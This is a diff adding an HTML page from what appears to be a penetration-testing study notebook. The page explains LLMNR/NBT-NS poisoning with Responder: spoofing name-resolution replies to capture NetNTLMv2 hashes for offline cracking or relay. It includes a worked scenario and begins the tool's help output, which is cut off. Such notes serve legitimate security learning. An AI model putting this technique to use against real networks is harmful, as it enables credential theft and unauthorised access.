@@ -1,0 +1,845 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Foothold - Cybersecurity Notes</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../../../favicon.svg">
+        <link rel="shortcut icon" href="../../../../favicon.png">
+        <link rel="stylesheet" href="../../../../css/variables.css">
+        <link rel="stylesheet" href="../../../../css/general.css">
+        <link rel="stylesheet" href="../../../../css/chrome.css">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" id="highlight-css" href="../../../../highlight.css">
+        <link rel="stylesheet" id="tomorrow-night-css" href="../../../../tomorrow-night.css">
+        <link rel="stylesheet" id="ayu-highlight-css" href="../../../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        <link rel="stylesheet" href="../../../../theme/pagetoc.css">
+
+
+        <!-- Provide site root and default themes to javascript -->
+        <script>
+            const path_to_root = "../../../../";
+            const default_light_theme = "light";
+            const default_dark_theme = "navy";
+            window.path_to_searchindex_js = "../../../../searchindex.js";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../../../toc.js"></script>
+    </head>
+    <body>
+    <div id="mdbook-help-container">
+        <div id="mdbook-help-popup">
+            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
+            <div>
+                <p>Press <kbd>←</kbd> or <kbd>→</kbd> to navigate between chapters</p>
+                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
+                <p>Press <kbd>?</kbd> to show this help</p>
+                <p>Press <kbd>Esc</kbd> to hide this help</p>
+            </div>
+        </div>
+    </div>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                let theme = localStorage.getItem('mdbook-theme');
+                let sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
+            let theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            let sidebar = null;
+            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+                sidebar_toggle.checked = false;
+            }
+            if (sidebar === 'visible') {
+                sidebar_toggle.checked = true;
+            } else {
+                html.classList.remove('sidebar-visible');
+            }
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Cybersecurity Notes</h1>
+
+                    <div class="right-buttons">
+                        <a href="https://github.com/d41y/d41y.github.io" title="Git repository" aria-label="Git repository">
+                            <i id="git-repository-button" class="fa fa-github"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <div class="search-wrapper">
+                            <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                            <div class="spinner-wrapper">
+                                <i class="fa fa-spinner fa-spin"></i>
+                            </div>
+                        </div>
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <style>
+.mdbook-callouts {
+  padding: 8px 16px;
+  margin-bottom: 16px;
+  border-radius: 4px;
+  /* border-left: 0.25em solid var(--mdbook-callouts-color); */
+  background: var(--mdbook-callouts-background);
+}
+
+.mdbook-callouts > *:first-child {
+  margin-top: 0;
+}
+
+.mdbook-callouts > *:last-child {
+  margin-bottom: 0;
+}
+
+.mdbook-callouts-title {
+  display: flex;
+  font-weight: 600;
+  align-items: center;
+  line-height: 1;
+  color: var(--mdbook-callouts-color);
+  text-transform: capitalize;
+}
+
+.mdbook-callouts-icon {
+  display: inline-block;
+  width: 1em;
+  height: 1em;
+  margin-right: 0.2em;
+  background-color: currentColor;
+  -webkit-mask: no-repeat center / 100%;
+  mask: no-repeat center / 100%;
+  -webkit-mask-image: var(--mdbook-callouts-icon);
+  mask-image: var(--mdbook-callouts-icon);
+}
+
+/* icons at: https://lucide.dev/icons/ */
+
+.mdbook-callouts-info {
+  --mdbook-callouts-color: rgb(var(--color-blue-rgb));
+  --mdbook-callouts-background: rgba(var(--color-blue-rgb), 0.1);
+  /* https://lucide.dev/icons/info */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWluZm8iPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjEwIi8+PHBhdGggZD0iTTEyIDE2di00Ii8+PHBhdGggZD0iTTEyIDhoLjAxIi8+PC9zdmc+');
+}
+
+.mdbook-callouts-note {
+  --mdbook-callouts-color: rgb(var(--color-blue-rgb));
+  --mdbook-callouts-background: rgba(var(--color-blue-rgb), 0.1);
+  /* https://lucide.dev/icons/pencil */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXBlbmNpbCI+PHBhdGggZD0iTTE3IDNhMi44NSAyLjgzIDAgMSAxIDQgNEw3LjUgMjAuNSAyIDIybDEuNS01LjVaIi8+PHBhdGggZD0ibTE1IDUgNCA0Ii8+PC9zdmc+');
+}
+
+.mdbook-callouts-tip,
+.mdbook-callouts-hint {
+  --mdbook-callouts-color: rgb(var(--color-cyan-rgb));
+  --mdbook-callouts-background: rgba(var(--color-cyan-rgb), 0.1);
+  /* https://lucide.dev/icons/flame */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWZsYW1lIj48cGF0aCBkPSJNOC41IDE0LjVBMi41IDIuNSAwIDAgMCAxMSAxMmMwLTEuMzgtLjUtMi0xLTMtMS4wNzItMi4xNDMtLjIyNC00LjA1NCAyLTYgLjUgMi41IDIgNC45IDQgNi41IDIgMS42IDMgMy41IDMgNS41YTcgNyAwIDEgMS0xNCAwYzAtMS4xNTMuNDMzLTIuMjk0IDEtM2EyLjUgMi41IDAgMCAwIDIuNSAyLjV6Ii8+PC9zdmc+');
+}
+
+.mdbook-callouts-important {
+  --mdbook-callouts-color: rgb(var(--color-purple-rgb));
+  --mdbook-callouts-background: rgba(var(--color-purple-rgb), 0.1);
+  /* https://lucide.dev/icons/alert-circle */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWFsZXJ0LWNpcmNsZSI+PGNpcmNsZSBjeD0iMTIiIGN5PSIxMiIgcj0iMTAiLz48bGluZSB4MT0iMTIiIHgyPSIxMiIgeTE9IjgiIHkyPSIxMiIvPjxsaW5lIHgxPSIxMiIgeDI9IjEyLjAxIiB5MT0iMTYiIHkyPSIxNiIvPjwvc3ZnPg==');
+}
+
+.mdbook-callouts-success,
+.mdbook-callouts-check,
+.mdbook-callouts-done {
+  --mdbook-callouts-color: rgb(var(--color-green-rgb));
+  --mdbook-callouts-background: rgba(var(--color-green-rgb), 0.1);
+  /* https://lucide.dev/icons/check */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWNoZWNrIj48cGF0aCBkPSJNMjAgNiA5IDE3bC01LTUiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-question,
+.mdbook-callouts-help,
+.mdbook-callouts-faq {
+  --mdbook-callouts-color: rgb(var(--color-pink-rgb));
+  --mdbook-callouts-background: rgba(var(--color-pink-rgb), 0.1);
+  /* https://lucide.dev/icons/help-circle */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWhlbHAtY2lyY2xlIj48Y2lyY2xlIGN4PSIxMiIgY3k9IjEyIiByPSIxMCIvPjxwYXRoIGQ9Ik05LjA5IDlhMyAzIDAgMCAxIDUuODMgMWMwIDItMyAzLTMgMyIvPjxwYXRoIGQ9Ik0xMiAxN2guMDEiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-warning,
+.mdbook-callouts-warn {
+  --mdbook-callouts-color: rgb(var(--color-orange-rgb));
+  --mdbook-callouts-background: rgba(var(--color-orange-rgb), 0.1);
+  /* https://lucide.dev/icons/alert-triangle */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWFsZXJ0LXRyaWFuZ2xlIj48cGF0aCBkPSJtMjEuNzMgMTgtOC0xNGEyIDIgMCAwIDAtMy40OCAwbC04IDE0QTIgMiAwIDAgMCA0IDIxaDE2YTIgMiAwIDAgMCAxLjczLTNaIi8+PHBhdGggZD0iTTEyIDl2NCIvPjxwYXRoIGQ9Ik0xMiAxN2guMDEiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-caution {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/shield-alert */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXNoaWVsZC1hbGVydCI+PHBhdGggZD0iTTEyIDIyczgtNCA4LTEwVjVsLTgtMy04IDN2N2MwIDYgOCAxMCA4IDEwIi8+PHBhdGggZD0iTTEyIDh2NCIvPjxwYXRoIGQ9Ik0xMiAxNmguMDEiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-failure,
+.mdbook-callouts-fail,
+.mdbook-callouts-missing {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/x */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXgiPjxwYXRoIGQ9Ik0xOCA2IDYgMTgiLz48cGF0aCBkPSJtNiA2IDEyIDEyIi8+PC9zdmc+');
+}
+
+.mdbook-callouts-error,
+.mdbook-callouts-danger {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/zap */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXphcCI+PHBvbHlnb24gcG9pbnRzPSIxMyAyIDMgMTQgMTIgMTQgMTEgMjIgMjEgMTAgMTIgMTAgMTMgMiIvPjwvc3ZnPg==');
+}
+
+.mdbook-callouts-bug {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/bug */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWJ1ZyI+PHBhdGggZD0ibTggMiAxLjg4IDEuODgiLz48cGF0aCBkPSJNMTQuMTIgMy44OCAxNiAyIi8+PHBhdGggZD0iTTkgNy4xM3YtMWEzLjAwMyAzLjAwMyAwIDEgMSA2IDB2MSIvPjxwYXRoIGQ9Ik0xMiAyMGMtMy4zIDAtNi0yLjctNi02di0zYTQgNCAwIDAgMSA0LTRoNGE0IDQgMCAwIDEgNCA0djNjMCAzLjMtMi43IDYtNiA2Ii8+PHBhdGggZD0iTTEyIDIwdi05Ii8+PHBhdGggZD0iTTYuNTMgOUM0LjYgOC44IDMgNy4xIDMgNSIvPjxwYXRoIGQ9Ik02IDEzSDIiLz48cGF0aCBkPSJNMyAyMWMwLTIuMSAxLjctMy45IDMuOC00Ii8+PHBhdGggZD0iTTIwLjk3IDVjMCAyLjEtMS42IDMuOC0zLjUgNCIvPjxwYXRoIGQ9Ik0yMiAxM2gtNCIvPjxwYXRoIGQ9Ik0xNy4yIDE3YzIuMS4xIDMuOCAxLjkgMy44IDQiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-examples,
+.mdbook-callouts-example {
+  --mdbook-callouts-color: rgb(var(--color-purple-rgb));
+  --mdbook-callouts-background: rgba(var(--color-purple-rgb), 0.1);
+  /* https://lucide.dev/icons/list */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWxpc3QiPjxsaW5lIHgxPSI4IiB4Mj0iMjEiIHkxPSI2IiB5Mj0iNiIvPjxsaW5lIHgxPSI4IiB4Mj0iMjEiIHkxPSIxMiIgeTI9IjEyIi8+PGxpbmUgeDE9IjgiIHgyPSIyMSIgeTE9IjE4IiB5Mj0iMTgiLz48bGluZSB4MT0iMyIgeDI9IjMuMDEiIHkxPSI2IiB5Mj0iNiIvPjxsaW5lIHgxPSIzIiB4Mj0iMy4wMSIgeTE9IjEyIiB5Mj0iMTIiLz48bGluZSB4MT0iMyIgeDI9IjMuMDEiIHkxPSIxOCIgeTI9IjE4Ii8+PC9zdmc+');
+}
+
+.mdbook-callouts-quote {
+  --mdbook-callouts-color: rgb(158, 158, 158);
+  --mdbook-callouts-background: rgba(158, 158, 158, 0.1);
+  /* https://lucide.dev/icons/quote */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXF1b3RlIj48cGF0aCBkPSJNMyAyMWMzIDAgNy0xIDctOFY1YzAtMS4yNS0uNzU2LTIuMDE3LTItMkg0Yy0xLjI1IDAtMiAuNzUtMiAxLjk3MlYxMWMwIDEuMjUuNzUgMiAyIDIgMSAwIDEgMCAxIDF2MWMwIDEtMSAyLTIgMnMtMSAuMDA4LTEgMS4wMzFWMjBjMCAxIDAgMSAxIDF6Ii8+PHBhdGggZD0iTTE1IDIxYzMgMCA3LTEgNy04VjVjMC0xLjI1LS43NTctMi4wMTctMi0yaC00Yy0xLjI1IDAtMiAuNzUtMiAxLjk3MlYxMWMwIDEuMjUuNzUgMiAyIDJoLjc1YzAgMi4yNS4yNSA0LTIuNzUgNHYzYzAgMSAwIDEgMSAxeiIvPjwvc3ZnPg==');
+}
+
+
+.ayu {
+  --color-red-rgb: 251, 70, 76;
+  --color-red: #fb464c;
+  --color-orange-rgb: 233, 151, 63;
+  --color-orange: #e9973f;
+  --color-yellow-rgb: 224, 222, 113;
+  --color-yellow: #e0de71;
+  --color-green-rgb: 68, 207, 110;
+  --color-green: #44cf6e;
+  --color-cyan-rgb: 83, 223, 221;
+  --color-cyan: #53dfdd;
+  --color-blue-rgb: 2, 122, 255;
+  --color-blue: #027aff;
+  --color-purple-rgb: 168, 130, 255;
+  --color-purple: #a882ff;
+  --color-pink-rgb: 250, 153, 205;
+  --color-pink: #fa99cd;
+}
+
+.light {
+  --color-red-rgb: 233, 49, 71;
+  --color-red: #e93147;
+  --color-orange-rgb: 236, 117, 0;
+  --color-orange: #ec7500;
+  --color-yellow-rgb: 224, 172, 0;
+  --color-yellow: #e0ac00;
+  --color-green-rgb: 8, 185, 78;
+  --color-green: #08b94e;
+  --color-cyan-rgb: 0, 191, 188;
+  --color-cyan: #00bfbc;
+  --color-blue-rgb: 8, 109, 221;
+  --color-blue: #086ddd;
+  --color-purple-rgb: 120, 82, 238;
+  --color-purple: #7852ee;
+  --color-pink-rgb: 213, 57, 132;
+  --color-pink: #d53984;
+}
+
+.coal {
+  --color-red-rgb: 251, 70, 76;
+  --color-red: #fb464c;
+  --color-orange-rgb: 233, 151, 63;
+  --color-orange: #e9973f;
+  --color-yellow-rgb: 224, 222, 113;
+  --color-yellow: #e0de71;
+  --color-green-rgb: 68, 207, 110;
+  --color-green: #44cf6e;
+  --color-cyan-rgb: 83, 223, 221;
+  --color-cyan: #53dfdd;
+  --color-blue-rgb: 2, 122, 255;
+  --color-blue: #027aff;
+  --color-purple-rgb: 168, 130, 255;
+  --color-purple: #a882ff;
+  --color-pink-rgb: 250, 153, 205;
+  --color-pink: #fa99cd;
+}
+
+.navy {
+  --color-red-rgb: 251, 70, 76;
+  --color-red: #fb464c;
+  --color-orange-rgb: 233, 151, 63;
+  --color-orange: #e9973f;
+  --color-yellow-rgb: 224, 222, 113;
+  --color-yellow: #e0de71;
+  --color-green-rgb: 68, 207, 110;
+  --color-green: #44cf6e;
+  --color-cyan-rgb: 83, 223, 221;
+  --color-cyan: #53dfdd;
+  --color-blue-rgb: 2, 122, 255;
+  --color-blue: #027aff;
+  --color-purple-rgb: 168, 130, 255;
+  --color-purple: #a882ff;
+  --color-pink-rgb: 250, 153, 205;
+  --color-pink: #fa99cd;
+}
+
+.rust {
+  --color-red-rgb: 233, 49, 71;
+  --color-red: #e93147;
+  --color-orange-rgb: 236, 117, 0;
+  --color-orange: #ec7500;
+  --color-yellow-rgb: 224, 172, 0;
+  --color-yellow: #e0ac00;
+  --color-green-rgb: 8, 185, 78;
+  --color-green: #08b94e;
+  --color-cyan-rgb: 0, 191, 188;
+  --color-cyan: #00bfbc;
+  --color-blue-rgb: 8, 109, 221;
+  --color-blue: #086ddd;
+  --color-purple-rgb: 120, 82, 238;
+  --color-purple: #7852ee;
+  --color-pink-rgb: 213, 57, 132;
+  --color-pink: #d53984;
+}
+</style>
+<ul>
+<li><a href="#sniffing-out-a-foothold">Sniffing out a Foothold</a>
+<ul>
+<li><a href="#llmnr--nbt-ns-poisoning---from-linux">LLMNR / NBT-NS Poisoning - from Linux</a>
+<ul>
+<li><a href="#responder">Responder</a></li>
+</ul>
+</li>
+<li><a href="#llmnr--nbt-ns-poisoning---from-windows">LLMNR / NBT-NS Poisoning - from Windows</a>
+<ul>
+<li><a href="#inveigh">Inveigh</a></li>
+<li><a href="#c-inveigh">C# Inveigh</a></li>
+</ul>
+</li>
+<li><a href="#remediation">Remediation</a></li>
+<li><a href="#detection">Detection</a></li>
+</ul>
+</li>
+</ul>
+<hr />
+<h1 id="sniffing-out-a-foothold"><a class="header" href="#sniffing-out-a-foothold">Sniffing out a Foothold</a></h1>
+<h2 id="llmnr--nbt-ns-poisoning---from-linux"><a class="header" href="#llmnr--nbt-ns-poisoning---from-linux">LLMNR / NBT-NS Poisoning - from Linux</a></h2>
+<p>Link-Local Multicast Name Resolution (<em>LLMNR</em>) and NetBIOS Name Service (<em>NBT-NS</em>) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails. If a machine attempts to resolve a host but DNS resolution fails, typically, the machine will try to ask all other machines on the local network for the correct host address via LLMNR. LLMNR is based upon the Domain Name System format and allows hosts on the same local link to perform name resolution for other hosts. It uses port 5355 over UDP natively. If LLMNR fails, the NBT-NS will be used. NBT-NS identifies systems on a local network by their NetBIOS name. NBT-NS utilizes port 137 over UDP.</p>
+<p>ANY host on the network can reply. This is where you come in with Responder to poison these requests. With network access, you can spoof an authoritative name resolution source in the broadcast domain by responding to LLMNR and NBT-NS traffic as if they have an answer for the requesting host. This poisoning effort is done to get the victims to communicate with your system by pretending that your rogue system knows the location of the requested host. If the requested host requires name resolution or authentication actions, you can capture the NetNTLM hash and subject it to an offline brute force attack in attempt to retrieve the cleartext password. The captured authentication request, can also be relayed to access another host or used against a different protocol on the same host. LLMNR/NBNS spoofing combined with a lack of SMB signing can often lead to administrative access on hosts within a domain.</p>
+<p>Example:</p>
+<ol>
+<li>A host attempts to connect to the print server at \print01.inlanefreight.local, but accidentally types in \printer01.inlanefreight.local.</li>
+<li>The DNS server responds, stating that this host is unknown.</li>
+<li>The host then broadcasts out to the entire local network asking if anyone knows the location of \printer01.inlanefreight.local.</li>
+<li>The attacker responds to the host stating that it is the \printer01.inlanefreight.local that the host is looking for.</li>
+<li>The host believes this reply and sends an authentication request to the attacker with a username and NTLMv2 password hash.</li>
+<li>This hash can then be cracked offline or used in an SMB relay attack if the right conditions exist.</li>
+</ol>
+<h3 id="responder"><a class="header" href="#responder">Responder</a></h3>
+<p>... is a relatively straightforward tool, but is extremely powerful and has many different functions.</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ responder -h
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR &amp; MDNS Responder 3.0.6.0
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+Usage: responder -I eth0 -w -r -f
+or:
+responder -I eth0 -wrf
+
+Options:
+  --version             show program's version number and exit
+  -h, --help            show this help message and exit
+  -A, --analyze         Analyze mode. This option allows you to see NBT-NS,
+                        BROWSER, LLMNR requests without responding.
+  -I eth0, --interface=eth0
